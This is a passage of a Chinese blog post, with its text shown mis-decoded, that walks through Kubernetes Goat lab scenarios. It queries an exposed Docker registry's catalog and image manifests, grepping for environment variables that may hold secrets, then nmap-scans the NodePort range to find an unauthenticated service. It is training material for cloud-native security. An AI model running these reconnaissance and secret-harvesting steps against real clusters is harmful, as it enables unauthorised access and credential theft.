<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> http://192.168.52.13:1235/v2/ <span class="token comment"># æŸ¥è¯¢api</span>
<span class="token function">curl</span> http://192.168.52.13:1235/v2/_catalog <span class="token comment"># æŸ¥è¯¢ç›®å½•ä¿¡æ¯ï¼Œå¯è¿”å›å®¹å™¨ä»“åº“ä¸­æ‰€æœ‰å¯ç”¨é•œåƒçš„å®Œæ•´è¯¦æƒ…ã€‚</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-19%2011.32.02.png" style="zoom:50%;">

<p>Docker Registryçš„v2 APIä¸­ï¼Œ/_catalogç«¯ç‚¹é€šå¸¸ç”¨æ¥åˆ—å‡ºä»“åº“ä¸­æ‰€æœ‰çš„é•œåƒåˆ—è¡¨ã€‚æ‰€ä»¥curlè¿™ä¸ªå‘½ä»¤çš„ä½œç”¨æ˜¯è·å–è¯¥ç§æœ‰ä»“åº“ä¸­æ‰€æœ‰å¯ç”¨çš„é•œåƒåç§°åˆ—è¡¨ã€‚</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> http://192.168.52.13:1235/v2/madhuakula/k8s-goat-users-repo/manifests/latest <span class="token comment"># é€šè¿‡å¸¦æœ‰æ ‡ç­¾çš„é•œåƒåç§°é…åˆæ¸…å•ç«¯ç‚¹è·å–è¯¥é•œåƒçš„è¯¦ç»†ä¿¡æ¯ã€‚</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-19%2011.34.33.png" style="zoom:50%;">

<p>è¿™ä¸ªå‘½ä»¤çš„ä½œç”¨æ˜¯è·å–æŒ‡å®šé•œåƒçš„æ¸…å•ï¼ˆmanifestï¼‰ï¼Œå…·ä½“æ¥è¯´ï¼Œæ˜¯<code>madhuakula/k8s-goat-users-repo</code>é•œåƒçš„<code>latest</code>æ ‡ç­¾å¯¹åº”çš„æ¸…å•ã€‚Docker Registry V2çš„APIä¸­ï¼Œmanifestç«¯ç‚¹æä¾›äº†é•œåƒçš„å…ƒæ•°æ®ï¼ŒåŒ…æ‹¬å„å±‚çš„æ‘˜è¦ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯å¯¹äºæ‹‰å–é•œåƒå’Œåˆ†æé•œåƒå†…å®¹éå¸¸å…³é”®ã€‚</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> http://192.168.52.13:1235/v2/madhuakula/k8s-goat-users-repo/manifests/latest <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-i</span> ENV<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-19%2013.35.21.png" style="zoom:50%;">

<blockquote>
<p>å¯ä»¥é€šè¿‡ä½¿ç”¨Dockerå®¢æˆ·ç«¯å°†é•œåƒä¸‹è½½åˆ°æœ¬åœ°è¿›è¡Œè¿›ä¸€æ­¥åˆ†æã€‚</p>
<p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ ¹æ®æƒé™å’Œç‰¹æƒè®¾ç½®ï¼Œç”šè‡³å¯ä»¥å°†é•œåƒæ¨é€åˆ°ä»“åº“ã€‚</p>
</blockquote>
<h2 id="3-6-NodePort-exposed-services"><a href="#3-6-NodePort-exposed-services" class="headerlink" title="3.6 NodePort exposed services"></a>3.6 NodePort exposed services</h2><p>Kubernetesé›†ç¾¤ä¸­é…ç½®é”™è¯¯çš„NodePortæœåŠ¡ã€‚</p>
<h3 id="3-6-1-åœºæ™¯ä»‹ç»"><a href="#3-6-1-åœºæ™¯ä»‹ç»" class="headerlink" title="3.6.1 åœºæ™¯ä»‹ç»"></a>3.6.1 åœºæ™¯ä»‹ç»</h3><p>åœ¨è¿™ä¸ªåœºæ™¯ä¸­ï¼Œæˆ‘ä»¬ä¼šçœ‹åˆ°å¦ä¸€ä¸ªé”™è¯¯é…ç½®ï¼Œå®ƒå¯èƒ½ä¼šè®©æ”»å‡»è€…è®¿é—®å†…éƒ¨æœåŠ¡å’Œæœªå…¬å¼€çš„æœåŠ¡ã€‚è¿™æ˜¯åœ¨åˆ›å»ºKubernetesæœåŠ¡ä»¥åŠé›†ç¾¤è®¾ç½®å’Œé…ç½®æ—¶å‘ç”Ÿçš„ç®€å•é…ç½®é”™è¯¯ä¹‹ä¸€ã€‚</p>
<p>å¦‚æœä»»ä½•ç”¨æˆ·ä½¿ç”¨NodePortåœ¨Kubernetesé›†ç¾¤ä¸­æš´éœ²ä»»ä½•æœåŠ¡ï¼Œè¿™æ„å‘³ç€Kubernetesé›†ç¾¤è¿è¡Œçš„èŠ‚ç‚¹æ²¡æœ‰å¯ç”¨ä»»ä½•é˜²ç«å¢™/ç½‘ç»œå®‰å…¨æªæ–½ã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸€äº›æœªç»è®¤è¯å’Œæœªç»æˆæƒçš„æœåŠ¡ã€‚</p>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-19%2013.52.14.png" style="zoom:50%;">

<p>å®è·µç›®çš„ï¼š</p>
<ul>
<li><p>Kubernetes NodePortçš„å·¥ä½œåŸç†ã€é…ç½®å’ŒèŒƒå›´ã€‚</p>
</li>
<li><p>æ‰§è¡Œç«¯å£æ‰«æå¹¶ä¸KubernetesèŠ‚ç‚¹äº¤äº’ã€‚</p>
</li>
</ul>
<blockquote>
<h4 id="Kubernetes-ä¸­çš„-NodePort-æœåŠ¡"><a href="#Kubernetes-ä¸­çš„-NodePort-æœåŠ¡" class="headerlink" title="Kubernetes ä¸­çš„ NodePort æœåŠ¡"></a>Kubernetes ä¸­çš„ <strong>NodePort æœåŠ¡</strong></h4><p>Kubernetes ä¸­çš„ <strong>NodePort æœåŠ¡</strong>æ˜¯ä¸€ç§å°†å†…éƒ¨åº”ç”¨æš´éœ²åˆ°é›†ç¾¤å¤–éƒ¨è®¿é—®çš„æœºåˆ¶ï¼Œå®ƒé€šè¿‡åœ¨æ‰€æœ‰èŠ‚ç‚¹ï¼ˆNodeï¼‰ä¸Šå¼€æ”¾ä¸€ä¸ªé™æ€ç«¯å£ï¼ˆ<strong>NodePort</strong>ï¼‰ï¼Œå…è®¸å¤–éƒ¨æµé‡é€šè¿‡ä»»æ„èŠ‚ç‚¹çš„ <code>IP:Port</code> è®¿é—®åç«¯ Podã€‚</p>
<ul>
<li>ç«¯å£æ˜ å°„è§„åˆ™</li>
</ul>
<p>1ï¼‰<strong>NodePort</strong>ï¼šå›ºå®šç«¯å£ï¼ˆé»˜è®¤èŒƒå›´ <code>30000-32767</code>ï¼‰ï¼Œåœ¨æ‰€æœ‰èŠ‚ç‚¹ä¸Šå¼€æ”¾ã€‚</p>
<p>2ï¼‰<strong>Service Port</strong>ï¼šæœåŠ¡çš„å†…éƒ¨ç«¯å£ï¼Œç”¨äºé›†ç¾¤å†…é€šä¿¡ï¼ˆå¦‚ Pod åˆ° Serviceï¼‰ã€‚</p>
<p>3ï¼‰<strong>Target Port</strong>ï¼šPod å®é™…ç›‘å¬çš„ç«¯å£ï¼ˆä¸å®¹å™¨å®šä¹‰ä¸€è‡´ï¼‰ã€‚</p>
<ul>
<li>æµé‡è·¯å¾„</li>
</ul>
<p>1ï¼‰å¤–éƒ¨ç”¨æˆ·é€šè¿‡ <code>ä»»æ„èŠ‚ç‚¹IP:NodePort</code> è®¿é—®æœåŠ¡ã€‚</p>
<p>2ï¼‰èŠ‚ç‚¹ä¸Šçš„ <code>kube-proxy</code> å°†æµé‡è½¬å‘åˆ° Serviceã€‚</p>
<p>3ï¼‰Service é€šè¿‡è´Ÿè½½å‡è¡¡å°†æµé‡åˆ†å‘åˆ°åç«¯ Podã€‚</p>
<p>NodePort æ˜¯ Kubernetes ä¸­å¿«é€Ÿæš´éœ²æœåŠ¡çš„è½»é‡çº§æ–¹æ¡ˆï¼Œé€‚ç”¨äºä¸´æ—¶è®¿é—®æˆ–èµ„æºå—é™çš„ç¯å¢ƒã€‚ä½†åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œå»ºè®®ä¼˜å…ˆä½¿ç”¨ <strong>LoadBalancer</strong> æˆ– <strong>Ingress</strong> å®ç°æ›´å®‰å…¨ã€çµæ´»çš„å¤–éƒ¨è®¿é—®ã€‚</p>
</blockquote>
<h3 id="3-6-2-åœºæ™¯è®¿é—®"><a href="#3-6-2-åœºæ™¯è®¿é—®" class="headerlink" title="3.6.2 åœºæ™¯è®¿é—®"></a>3.6.2 åœºæ™¯è®¿é—®</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kubectl get nodes <span class="token parameter variable">-o</span> wide<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p><code>kubectl get nodes -o wide</code> çš„ä½œç”¨æ˜¯<strong>æŸ¥çœ‹ Kubernetes é›†ç¾¤ä¸­æ‰€æœ‰èŠ‚ç‚¹çš„è¯¦ç»†ä¿¡æ¯</strong>ï¼ŒåŒ…æ‹¬èŠ‚ç‚¹çš„ç½‘ç»œåœ°å€ã€æ“ä½œç³»ç»Ÿã€èµ„æºå®¹é‡ç­‰æ‰©å±•å­—æ®µã€‚</p>
<p>å‡è®¾æ‰§è¡Œå‘½ä»¤åè¾“å‡ºå¦‚ä¸‹ï¼š</p>
<table>
<thead>
<tr>
<th align="center"><strong>å­—æ®µ</strong></th>
<th align="center"><strong>è¯´æ˜</strong></th>
<th align="center"><strong>å®é™…ç”¨é€”åœºæ™¯</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>NAME</code></td>
<td align="center">èŠ‚ç‚¹åç§°ï¼ˆç”± <code>kubelet</code> çš„ <code>--hostname-override</code> æˆ–äº‘å¹³å°è‡ªåŠ¨åˆ†é…ï¼‰ã€‚</td>
<td align="center">å®šä½ç‰¹å®šèŠ‚ç‚¹ï¼ˆå¦‚æ—¥å¿—æ£€ç´¢ã€èŠ‚ç‚¹ç»´æŠ¤ï¼‰ã€‚</td>
</tr>
<tr>
<td align="center"><code>STATUS</code></td>
<td align="center">èŠ‚ç‚¹çŠ¶æ€ï¼š<code>Ready</code>ï¼ˆæ­£å¸¸ï¼‰ã€<code>NotReady</code>ï¼ˆå¼‚å¸¸ï¼‰ã€<code>SchedulingDisabled</code>ï¼ˆç¦æ­¢è°ƒåº¦ï¼‰ç­‰ã€‚</td>
<td align="center">å¿«é€Ÿåˆ¤æ–­èŠ‚ç‚¹æ˜¯å¦å¥åº·ï¼Œæ’æŸ¥ Pod æ— æ³•è°ƒåº¦çš„é—®é¢˜ã€‚</td>
</tr>
<tr>
<td align="center"><code>ROLES</code></td>
<td align="center">èŠ‚ç‚¹è§’è‰²ï¼š<code>control-plane</code>ï¼ˆæ—§ç‰ˆæ˜¾ç¤º <code>master</code>ï¼‰ã€<code>worker</code>ï¼ˆé»˜è®¤æ— è§’è‰²ï¼Œå¯èƒ½æ˜¾ç¤º <code>&lt;none&gt;</code>ï¼‰ã€‚</td>
<td align="center">åŒºåˆ†æ§åˆ¶å¹³é¢èŠ‚ç‚¹å’Œå·¥ä½œèŠ‚ç‚¹ï¼ˆå¦‚ç¦æ­¢åœ¨ Master èŠ‚ç‚¹éƒ¨ç½²åº”ç”¨ Podï¼‰ã€‚</td>
</tr>
<tr>
<td align="center"><code>AGE</code></td>
<td align="center">èŠ‚ç‚¹åŠ å…¥é›†ç¾¤çš„æ—¶é—´ï¼ˆå¦‚ <code>15d</code> è¡¨ç¤º 15 å¤©å‰ï¼‰ã€‚</td>
<td align="center">è¯„ä¼°èŠ‚ç‚¹ç¨³å®šæ€§ï¼ˆæ–°åŠ å…¥èŠ‚ç‚¹å¯èƒ½é…ç½®å¼‚å¸¸ï¼‰ã€‚</td>
</tr>
<tr>
<td align="center"><code>VERSION</code></td>
<td align="center">èŠ‚ç‚¹ä¸Š Kubernetes ç»„ä»¶ï¼ˆkubeletï¼‰çš„ç‰ˆæœ¬ã€‚</td>
<td align="center">ç¡®è®¤é›†ç¾¤ç‰ˆæœ¬ä¸€è‡´æ€§ï¼ˆç‰ˆæœ¬å·®å¼‚å¯èƒ½å¯¼è‡´å…¼å®¹æ€§é—®é¢˜ï¼‰ã€‚</td>
</tr>
<tr>
<td align="center"><code>INTERNAL-IP</code></td>
<td align="center">èŠ‚ç‚¹å†…éƒ¨ç½‘ç»œ IPï¼ˆé›†ç¾¤å†…é€šä¿¡ä½¿ç”¨ï¼‰ã€‚</td>
<td align="center">ç”¨äº Pod è·¨èŠ‚ç‚¹é€šä¿¡æˆ–æœåŠ¡é—´è°ƒç”¨ï¼ˆå¦‚ <code>ClusterIP</code> æœåŠ¡ï¼‰ã€‚</td>
</tr>
<tr>
<td align="center"><code>EXTERNAL-IP</code></td>
<td align="center">èŠ‚ç‚¹å¤–éƒ¨å¯è®¿é—®çš„ IPï¼ˆè‹¥å­˜åœ¨ï¼Œé€šå¸¸ç”±äº‘å¹³å°è‡ªåŠ¨å¡«å……ï¼‰ã€‚</td>
<td align="center">é€šè¿‡ <code>NodePort</code> æœåŠ¡ç›´æ¥è®¿é—®èŠ‚ç‚¹ï¼ˆç”Ÿäº§ç¯å¢ƒæ…ç”¨ï¼Œå»ºè®®ç”¨è´Ÿè½½å‡è¡¡å™¨æ›¿ä»£ï¼‰ã€‚</td>
</tr>
<tr>
<td align="center"><code>OS-IMAGE</code></td>
<td align="center">èŠ‚ç‚¹çš„æ“ä½œç³»ç»Ÿä¿¡æ¯ï¼ˆå¦‚ Ubuntuã€CentOSï¼‰ã€‚</td>
<td align="center">ç¡®è®¤æ“ä½œç³»ç»Ÿå…¼å®¹æ€§ï¼ˆå¦‚æŸäº›åº”ç”¨éœ€ç‰¹å®š OS æ”¯æŒï¼‰ã€‚</td>
</tr>
<tr>
<td align="center"><code>KERNEL-VERSION</code></td>
<td align="center">èŠ‚ç‚¹çš„ Linux å†…æ ¸ç‰ˆæœ¬ã€‚</td>
<td align="center">æ’æŸ¥å†…æ ¸çº§é—®é¢˜ï¼ˆå¦‚å®‰å…¨æ¼æ´ä¿®å¤ã€å†…æ ¸æ¨¡å—ä¾èµ–ï¼‰ã€‚</td>
</tr>
<tr>
<td align="center"><code>CONTAINER-RUNTIME</code></td>
<td align="center">å®¹å™¨è¿è¡Œæ—¶åŠå…¶ç‰ˆæœ¬ï¼ˆå¦‚ <code>containerd://1.6.21</code>ã€<code>docker://20.10.23</code>ï¼‰ã€‚</td>
<td align="center">è¯Šæ–­å®¹å™¨è¿è¡Œæ—¶é—®é¢˜ï¼ˆå¦‚ç‰ˆæœ¬ä¸å…¼å®¹å¯¼è‡´ Pod å¯åŠ¨å¤±è´¥ï¼‰ã€‚</td>
</tr>
</tbody></table>
</blockquote>
<p><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-19%2014.17.09.png" alt="æˆªå±2025-05-19 14.17.09"></p>
<p>ç›®æ ‡ï¼š</p>
<ul>
<li>å¦‚æœä½¿ç”¨NodePortå¯ä»¥ä½¿ç”¨èŠ‚ç‚¹çš„å…¬å…±IPåœ°å€è®¿é—®å…ƒæ•°æ®æ•°æ®åº“æœåŠ¡ï¼Œåˆ™å¯ä»¥å®Œæˆè¯¥åœºæ™¯ã€‚</li>
</ul>
<h3 id="3-6-3-å®è·µ"><a href="#3-6-3-å®è·µ" class="headerlink" title="3.6.3 å®è·µ"></a>3.6.3 å®è·µ</h3><ul>
<li>nmapç«¯å£æ‰«æ</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token number">192.168</span>.52.13 <span class="token parameter variable">-p</span> <span class="token number">30000</span>-32767 <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-sV</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-19%2014.21.51.png" style="zoom:50%;">

<p>é€šè¿‡æ‰«æçœ‹åˆ°30003ç«¯å£å¼€å¯ï¼Œæ¨æµ‹æ˜¯é€šè¿‡NodePortæ˜ å°„å‡ºæ¥çš„æœåŠ¡ã€‚</p>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-19%2014.23.05.png" style="zoom:50%;">

<ul>
<li>æœªæˆæƒè®¿é—®</li>
</ul>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNs